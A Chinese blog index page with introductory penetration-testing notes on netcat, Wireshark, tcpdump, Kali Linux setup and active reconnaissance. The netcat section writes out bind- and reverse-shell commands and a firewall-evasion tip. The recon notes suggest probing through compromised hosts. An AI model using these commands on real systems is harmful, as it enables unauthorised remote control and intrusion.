<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://shu1l.github.io/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="article:author" content="Shu1L">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://shu1l.github.io/page/4/"/>





  <title>Hexo</title>
  








<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/" itemprop="url">渗透测试——基本工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T21:46:13+08:00">
                2020-03-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="渗透测试——基本工具"><a href="#渗透测试——基本工具" class="headerlink" title="渗透测试——基本工具"></a>渗透测试——基本工具</h3><h4 id="一、NETCAT（nc"><a href="#一、NETCAT（nc" class="headerlink" title="一、NETCAT（nc)"></a>一、NETCAT（nc)</h4><ul>
<li>网络工具中的瑞士军刀（小身材、大智慧）</li>
<li>侦听模式/传输模式</li>
<li>telent/获取banner信息</li>
<li>传输文本信息</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<p><strong>NC（TELNET/BANNER功能）</strong></p>
<ul>
<li>nc -nv 1.1.1.1 110</li>
<li>nc -nv 1.1.1.1 25</li>
<li>nc -nv 1.1.1.1 80</li>
</ul>
<p>nc作为客户端时，可以对服务器端进行侦听</p>
<p><strong>示例：</strong></p>
<p>ping pop3.163.com  #查看163邮箱pop3的IP地址</p>
<p>nc -nv 123.125.50.29 110 #n只跟IP地址，不对DNS地址进行解析；v显示详细输出信息；参数后面跟                                                服务IP和端口</p>
<p>user   邮箱用户名（base64编码）   邮箱密码（base64编码）</p>
<p>通过以上命令可以在命令行下接受邮件。</p>
<h5 id="NC（传输文本信息）"><a href="#NC（传输文本信息）" class="headerlink" title="NC（传输文本信息）"></a><strong>NC（传输文本信息）</strong></h5><p><strong>示例</strong>：</p>
<p>服务器端：nc -l -p 3333  #-l 表示侦听 -p指定打开的端口号</p>
<p>​                   netstat -pantu | grep 3333 #查看3333端口是否打开</p>
<p>客户端： nc -nv 192.168.1.132 3333 #参数后面跟服务器的IP地址和开放的端口。</p>
<h5 id="NC（远程电子取证信息收集"><a href="#NC（远程电子取证信息收集" class="headerlink" title="NC（远程电子取证信息收集)"></a><strong>NC（远程电子取证信息收集)</strong></h5><p><strong>示例1：</strong></p>
<p>A对B当前目录信息进行取证</p>
<p>A：nc -l -p 3333 #-l表示侦听 -p指定打开的端口号 A对3333端口开始侦听</p>
<p>B：ls -l | nc -nv 192.168.153.132 3333 #将当前目录下的文件属性列表信息传递给A。</p>
<p><strong>示例2：</strong></p>
<p>A对B当前系统进程信息进行取证并存档</p>
<p>A:nc -l -p 3333&gt;ps.txt #侦听3333端口，并把侦听内容重定向到当前目录的1.txt文件里</p>
<p>B:ps aux | nc -nv 192.168.153.132 -q 1 #将当前系统进程信息进行取证并存档到1.txt中  -q表示自动                                                                        断开nc连接</p>
<p>A:cat ps.txt #查看ps.txt文件内容</p>
<p>远程电子取证信息收集尽量少的去对目标机器进行修改。</p>
<h5 id="NC（传输文件）"><a href="#NC（传输文件）" class="headerlink" title="NC（传输文件）"></a><strong>NC（传输文件）</strong></h5><p><strong>正向文件运输</strong></p>
<p>A：mc -l -p 3333&gt;1.mp4 #侦听端为文件接受端，接受对方3333端口发送的文件并命名为1.mp4</p>
<p>B：nc -nv 192.168.153.132 3333 &lt;1.mp4 -q 1 #文件发送端</p>
<p><strong>反向文件运输</strong></p>
<p>A: nc -lp 3333&lt; 1.mp4 -q 1 #侦听端为文件发送端，将1.mp4这个文件放在3333侦听端口上等待对方接收</p>
<p>B: nc -nv 192.168.0.5 3333&gt; 1.mp4  #文件接收端</p>
<h5 id="NC（传输目录）"><a href="#NC（传输目录）" class="headerlink" title="NC（传输目录）"></a><strong>NC（传输目录）</strong></h5><h5 id="NC（流媒体服务"><a href="#NC（流媒体服务" class="headerlink" title="NC（流媒体服务)"></a><strong>NC（流媒体服务)</strong></h5><p><strong>示例：</strong></p>
<p>A：cat 1.mp4 | nc -l -p 3333  #A端为流媒体输出端，将1.mp4这个文件打开并通过3333端口进行输                                                        出</p>
<p>B：nc -nv 192.168.153.130 | mplayer -vo x11 -cache 3000 #B端为流媒体客户端，将侦听A端3333                    端口，并通过mplayer媒体播放器进行播放，设定缓存为3000K</p>
<h5 id="NC（端口扫描）"><a href="#NC（端口扫描）" class="headerlink" title="NC（端口扫描）"></a><strong>NC（端口扫描）</strong></h5><p><strong>示例：</strong></p>
<p>nc -nvz 192.168.153.130 1-65535 #扫描目标主机TCP 1-65535开放的端口</p>
<p>nc -nvzu 192.168.153.130 1-65535 #扫描目标主机UDP 1-1024开放的端口</p>
<h5 id="NC（远程控制）"><a href="#NC（远程控制）" class="headerlink" title="NC（远程控制）"></a><strong>NC（远程控制）</strong></h5><p>服务器端开启远程控制：</p>
<p>服务器：nc -lp port -c bash#把shell交给过来连接的客户端</p>
<p>客户端：nc -nv ip port </p>
<p>客户端开启远程控制：</p>
<p>服务器端：nc -lp port</p>
<p>客户端：nc -nv IP port -c bash </p>
<p>window上将-c bash 改为-c cmd</p>
<p>注意事项：服务器防火墙一般会限制外网对内网的访问，但是内网对外网的访问限制可能被忽略。</p>
<p>​                    内网对外网的访问限制：将DNS服务器单独隔离出来，只开放53端口开放侦听外网，</p>
<p>​                    主动在客户端开启一个端口，并在服务器上侦听该端口，且把shell交给客户端。这种方式不容易被防火墙拦截。</p>
<h5 id="NC的缺陷"><a href="#NC的缺陷" class="headerlink" title="NC的缺陷"></a><strong>NC的缺陷</strong></h5><p>缺乏数据加密和身份认证的能力</p>
<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h5><p>nmap工具包中的ncat，设计用于弥补NC的缺陷。</p>
<p>nc版本太多，参数各不相同，使用起来有困难。</p>
<p>Ubantu版本没有-c，需要用临时文件去转换bash</p>
<p>遇到问题查看man命令手册（系统自带软件）</p>
<p>服务端开启端口：ncat -c bash –allow IP(指定可连接的客户端IP）-vnl port –ssl（防止嗅探者查看到明文信息）</p>
<p>客户端连接：ncat -nv IP port  –ssl    互相交换指纹是一对一连接，保证安全。</p>
<h4 id="二、WIRESHARK"><a href="#二、WIRESHARK" class="headerlink" title="二、WIRESHARK"></a>二、WIRESHARK</h4><p><strong>常用功能</strong></p>
<ul>
<li>抓包嗅探协议分析</li>
<li>抓包引擎</li>
<li>Libpcap9–Linux</li>
<li>winpcap10-windows</li>
</ul>
<p><strong>基本使用方法：</strong></p>
<p>1、终端输入wireshark，启动</p>
<p> 2、选择要抓包的网卡。</p>
<p> 3、打开捕获选项，勾选混杂模式（只抓捕本地信息（网卡绑定的ip地址信息），如果不选择捕获模式则无法获取广播（当前网络中的所有信息）信息）。</p>
<p>4、选择捕获过滤器,可以选择要抓包的内容，如ip地址 格式 host ip地址或者其他协议。</p>
<p> 5、停止抓包后保存内容，尽量使用pcap格式。兼容性较好。</p>
<p> 6、通过分析-显示过滤器对抓包结果进行过滤</p>
<p><strong>数据包的分层结构</strong></p>
<ul>
<li>Arp</li>
<li>lcmp</li>
<li>Tcp三次握手</li>
</ul>
<p>1.源向目标发送syn包（确认连接）</p>
<p>2.目标向源发送syn、ack（回应并向源确认）</p>
<p>3.源向目标发送ack包（回应目标发送的syn）</p>
<ul>
<li>Udp</li>
<li>Dns</li>
<li>http</li>
<li>ftp</li>
</ul>
<p><strong>数据流</strong></p>
<ul>
<li>TCP流</li>
<li>UDP流</li>
<li>SSL流</li>
<li>HTTP流</li>
</ul>
<h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><h5 id="tcpdump——抓包"><a href="#tcpdump——抓包" class="headerlink" title="tcpdump——抓包"></a>tcpdump——抓包</h5><p>​       wireshark是图形化工具，在服务器等没有图形化界面的设备上无法使用，此时tcpdump命令行工具可以代替</p>
<pre><code>tcpdump -i eth0 -s 0 -w a.cap/b.pcap</code></pre><p>-i 指定抓包接口，-s 指定抓包大小，0为抓取整个包，不指定则默认抓取64字节。-w 将抓到的包保存到某个文件，不指定则实时显示</p>
<pre><code>tcpdump -r a.cap/b.cap</code></pre><p>-r read读取</p>
<pre><code>tcpdump -A -r a.cap/b.cap</code></pre><p>-A 使用ascii码表转码显示，不要加在-r后面，不然会报错 -X 使用16进制显示</p>
<h5 id="tcpdump——抓包筛选器"><a href="#tcpdump——抓包筛选器" class="headerlink" title="tcpdump——抓包筛选器"></a>tcpdump——抓包筛选器</h5><pre><code>tcpdump -i eth0 port 22</code></pre><p>抓以太网0上22端口的包。</p>
<pre><code>tcpdump -i eth0 tcp port 22</code></pre><p>抓以太网0上22端口的TCP包。 curl -v URL</p>
<h5 id="tcpdump——显示筛选器"><a href="#tcpdump——显示筛选器" class="headerlink" title="tcpdump——显示筛选器"></a>tcpdump——显示筛选器</h5><pre><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u</code></pre><p>-n 不对IP进行域名解析  AWK 默认用空格做分割 -u unique去重</p>
<pre><code>tcpdump -n src host IP -r file.cap/file.pcap</code></pre><p>src host IP 指定来源IP，src–&gt;source</p>
<pre><code>tcpdump -n dst host IP -r file.cap/file.pcap</code></pre><p>dst destination，指定目标IP</p>
<pre><code>tcpdump -n udp port 53  -r file.cap/file.pcap</code></pre><p>udp 指定显示的协议  port 53 指定端口</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/linux-an-zhuang/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/12/linux-an-zhuang/" itemprop="url">kali linux安装相关知识</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T21:09:50+08:00">
                2020-03-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="kali-linux安装部分相关知识"><a href="#kali-linux安装部分相关知识" class="headerlink" title="kali linux安装部分相关知识"></a>kali linux安装部分相关知识</h3><h4 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h4><h5 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h5><ul>
<li><p>下载安装镜像</p>
<p><a href="https://www.kali.org/downloads" target="_blank" rel="noopener">https://www.kali.org/downloads</a></p>
</li>
<li><p>验证hash值</p>
</li>
<li><p>制作启动光盘</p>
<p>live</p>
</li>
<li><p>制作启动U盘</p>
</li>
<li><p>设置BIOS启动顺序</p>
</li>
<li><p>启动安装</p>
</li>
</ul>
<h5 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h5><ul>
<li>虚拟化和Docker</li>
<li>kali Docker image<ul>
<li><a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="noopener">https://www.kali.org/news/official-kali-linux-docker-images/</a></li>
<li><a href="https://github.com/offensive-security/kali-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kali-linux-docker</a></li>
</ul>
</li>
</ul>
<h5 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h5><ul>
<li>官方VM镜像</li>
<li>vmware workstation</li>
<li>virtualBox<ul>
<li>下载、安装、扩展工具、基本使用</li>
<li>win8系统</li>
<li>安装kali</li>
<li>安装tools</li>
</ul>
</li>
</ul>
<h4 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h4><ul>
<li>登录密码</li>
<li>TOP 10安全工具</li>
<li>字体调整</li>
<li>强行终止程序</li>
<li>文件目录</li>
<li>共享文件</li>
</ul>
<h4 id="常见linux命令"><a href="#常见linux命令" class="headerlink" title="常见linux命令"></a>常见linux命令</h4><p>*<em>chmod *</em>控制文件如何被他人所调用</p>
<ul>
<li><p>​    u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p>
</li>
<li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p>
</li>
<li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p>
<p>数字来表示权限</p>
</li>
</ul>
<p>​    r=4,w=2,x=1</p>
<ul>
<li>若要rwx属性则4+2+1=7；</li>
<li>若要rw-属性则4+2=6；</li>
<li>若要r-x属性则4+1=5。<ul>
<li>​    chmod ugo+r test.txt ，chmod a+r file1.txt  #将文件设为所有人皆可读取</li>
<li>chmod 777 test.txt  #用数字来表示权限</li>
</ul>
</li>
</ul>
<p><strong>ls</strong> 显示目录下文件 </p>
<ul>
<li>-l    列出文件详细信息</li>
<li>-a   列出当前目录下所有文件及目录，包括隐藏文件</li>
</ul>
<p><strong>mkdir</strong> 创建目录</p>
<ul>
<li>-p 创建目录，若无父目录，则创建p(parent)</li>
</ul>
<p><strong>pwd</strong> 查看当前工作目录</p>
<p><strong>cp</strong>:复制文件</p>
<p><strong>cd</strong> #切换目录</p>
<ul>
<li>cd ~ #跳到自己的home目录</li>
</ul>
<p><strong>touch:</strong>创建空文件</p>
<p><strong>echo:</strong>创建带有内容的文件</p>
<p><strong>cat</strong> 查看文件内容</p>
<ul>
<li>n 或 –number：由 1 开始对所有输出的行数编号。</li>
<li>-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。</li>
<li>-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</li>
<li>-v 或 –show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。</li>
<li>-E 或 –show-ends : 在每行结束处显示 $。</li>
<li>-T 或 –show-tabs: 将 TAB 字符显示为 ^I。</li>
<li>-A, –show-all：等价于 -vET。</li>
<li>-e：等价于”-vE”选项；</li>
<li>-t：等价于”-vT”选项；</li>
</ul>
<p><strong>fInd</strong>  在文件系统中搜索某文件</p>
<ul>
<li>​    find / name <em>xxx\</em>.c  #模糊查找目录下的文件<ul>
<li>​    find /var/log -type f -mtime +7  -ok rm {} \  #查找/var/log目录中更改时间在7日以前的普通文                                                                                    件，并在删除之前询问它们： </li>
<li>find . -type f -perm 644 -exec ls -l {} \   #查找前目录中文件属主具有读写权限                                                                    </li>
</ul>
</li>
</ul>
<p><strong>wc</strong> 统计文本中行数、字数、字符数</p>
<p><strong>grep</strong> 在文本文件中查找某个字符串</p>
<ul>
<li>grep “被查找的字符串“ 文件名</li>
<li>grep  -e “正则表达式“ 文件名</li>
<li>grep -i  “被查找的字符串” 文件名    #忽略大小写</li>
</ul>
<p><strong>pwd</strong> 显示当前目录</p>
<p><strong>more less</strong> 分页显示文本文件内容</p>
<p><strong>head tail</strong> 显示文件头、尾内容</p>
<p><strong>mv</strong> 移动或重命名</p>
<p><strong>us</strong> #切换管理员目录</p>
<p><strong>./文件名</strong>  #执行文件</p>
<p><strong>rm</strong> 文件名 #删除文件</p>
<p><strong>rm -r</strong> 文件夹名 #删除文件夹</p>
<h5 id="二、Linux系统管理命令"><a href="#二、Linux系统管理命令" class="headerlink" title="二、Linux系统管理命令"></a>二、Linux系统管理命令</h5><p><strong>chmod</strong>控制文件如何被他人所调用。</p>
<p><strong>stat</strong>        显示指定文件的详细信息，比ls更详细</p>
<p><strong>who</strong>        显示在线登陆用户</p>
<p><strong>whoami</strong>      显示当前操作用户</p>
<p><strong>hostname</strong>    显示主机名</p>
<p><strong>uname</strong>      显示系统信息</p>
<p><strong>top</strong>         动态显示当前耗费资源最多进程信息</p>
<p><strong>ps</strong>          显示瞬间进程状态 ps -au</p>
<ul>
<li>ps -A    #显示进程信息</li>
<li>ps -u root     #显示root用户进程信息</li>
<li>ps -aux      # 显示所有包含其他使用者的行程</li>
</ul>
<p><strong>du</strong>          查看目录大小 du -h /home带有单位显示目录信息</p>
<p><strong>df</strong>          查看磁盘大小 df -h 带有单位显示磁盘信息</p>
<p><strong>ifconfig</strong>      查看网络情况</p>
<p><strong>ping</strong>         测试网络连通</p>
<p><strong>netstat</strong>      显示网络状态信息</p>
<p><strong>clear</strong>        清屏</p>
<p><strong>alias</strong>        对命令重命名 如：alias showmeit=”ps -aux” ，另外解除使用unaliax showmeit</p>
<p><strong>kill</strong>         杀死进程，可以先用ps 或 top命令查看进程的id，然后再用kill命令杀死进程。</p>
<ul>
<li>kill -9  $(ps -ef | grep hnlinux)  #过滤出hnlinux用户进程</li>
<li>kill -u hnlinux  #方法二</li>
<li>kill -KILL 123456+  #强制杀死进程</li>
</ul>
<h5 id="三、vim使用"><a href="#三、vim使用" class="headerlink" title="三、vim使用"></a>三、vim使用</h5><p>vim三种模式：命令模式、插入模式、编辑模式。使用ESC或i或：l来切换模式。</p>
<p>命令模式下：</p>
<p><strong>q</strong>            退出</p>
<p><strong>:q!</strong>           强制退出</p>
<p><strong>:wq</strong>          保存并退出</p>
<p><strong>:set number</strong>   显示行号</p>
<p><strong>:set nonumber</strong>  隐藏行号</p>
<p><strong>/apache</strong>       在文档中查找apache 按n跳到下一个，shift+n上一个</p>
<p><strong>yyp</strong>          复制光标所在行，并粘贴</p>
<p>(左移一个字符←)、j(下一行↓)、k(上一行↑)、l(右移一个字符→)</p>
<h5 id="四、Kali-Linux目录结构（文件系统）"><a href="#四、Kali-Linux目录结构（文件系统）" class="headerlink" title="四、Kali Linux目录结构（文件系统）"></a>四、Kali Linux目录结构（文件系统）</h5><p><strong>bin</strong> 所有用户都可以使用的程序目录</p>
<p><strong>boot</strong> 引导程序GRUB等的存放目录</p>
<p><strong>dev</strong> 存放所有的设备目录</p>
<p><strong>etc</strong> 主要的存放配置文件的目录</p>
<p><strong>home</strong> 用户主目录 </p>
<p><strong>lib</strong> 库文件目录</p>
<p><strong>live-bulid</strong> build自己的kali版本的目录</p>
<p><strong>media</strong> 默认挂载外接存储的目录</p>
<p><strong>mnt</strong> 以前的linux常用的挂载目录</p>
<p><strong>usr</strong> 存放执行程序、共享文件</p>
<p><strong>var</strong> 存放日志、邮件等经常变化的内容。</p>
<h5 id="五、文件读写权限"><a href="#五、文件读写权限" class="headerlink" title="五、文件读写权限"></a>五、文件读写权限</h5><p>三种基本权限</p>
<p><strong>R</strong>      读     数值表示为4</p>
<p><strong>W</strong>     写     数值表示为2</p>
<p><strong>X</strong>      可执行  数值表示为1</p>
<h5 id="六、打包压缩命令"><a href="#六、打包压缩命令" class="headerlink" title="六、打包压缩命令"></a>六、打包压缩命令</h5><p><strong>gzip：</strong></p>
<ul>
<li>gzip *            #压缩目录下的所有文件</li>
<li>gzip -dv *    #解压文件，并列出详细信息</li>
</ul>
<p><strong>bzip2：</strong></p>
<p><strong>tar:</strong>         打包压缩</p>
<p>   <strong>-c</strong>        归档文件</p>
<p>   <strong>-x</strong>        压缩文件</p>
<p>   <strong>-z</strong>        gzip压缩文件</p>
<p>   <strong>-j</strong>        bzip2压缩文件</p>
<p>   <strong>-v</strong>        显示压缩或解压缩过程 v(view)</p>
<p>   <strong>-f</strong>        使用档名</p>
<p>例：</p>
<p><strong>tar -cvf /home/abc.tar /home/abc</strong>        只打包，不压缩</p>
<p><strong>tar -zcvf /home/abc.tar.gz /home/abc</strong>     打包，并用gzip压缩</p>
<p><strong>tar -jcvf /home/abc.tar.bz2 /home/abc</strong>    打包，并用bzip2压缩</p>
<p>当然，如果想解压缩，就直接替换上面的命令 tar -cvf / tar -zcvf / tar -jcvf 中的“c” 换成“x” 就可以了。</p>
<h5 id="七、linux管道"><a href="#七、linux管道" class="headerlink" title="七、linux管道"></a>七、linux管道</h5><p>将一个命令的标准输出作为另一个命令的标准输入</p>
<p>例：grep -r “close” /home/* | more    在home目录下所有文件中查找，包括close的文件，并分页输出。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/" itemprop="url">渗透测试——主动信息收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T20:55:39+08:00">
                2020-03-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="主动信息收集部分"><a href="#主动信息收集部分" class="headerlink" title="主动信息收集部分"></a>主动信息收集部分</h3><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul>
<li><p>直接与目标主机交互</p>
</li>
<li><p>无法避免留下发文的痕迹；</p>
</li>
<li><p>使用受控的第三方电脑进行探测；</p>
</li>
<li><p>使用代理或者已经被控制的主机</p>
</li>
<li><p>做好被封杀的准备</p>
</li>
<li><p>使用噪音迷惑目标，淹没真实的探测流量</p>
</li>
<li><p>扫描-发送不同的探测，根据返回结果判断目标状态</p>
</li>
</ul>
<h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul>
<li>识别活着的主机</li>
<li>潜在的被攻击目标</li>
<li>输出一个IP地址列表</li>
<li>网络2、3、4层发现</li>
</ul>
<p>包括ARP、IPv4、IPv6、ICMP、IPSec、TCP、UDP</p>
<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><p>优点：扫描速度快，可靠</p>
<p>缺点：不可路由</p>
<h5 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h5><ul>
<li><p>抓包</p>
</li>
<li><p>arping 1.1.1.1 -c 1</p>
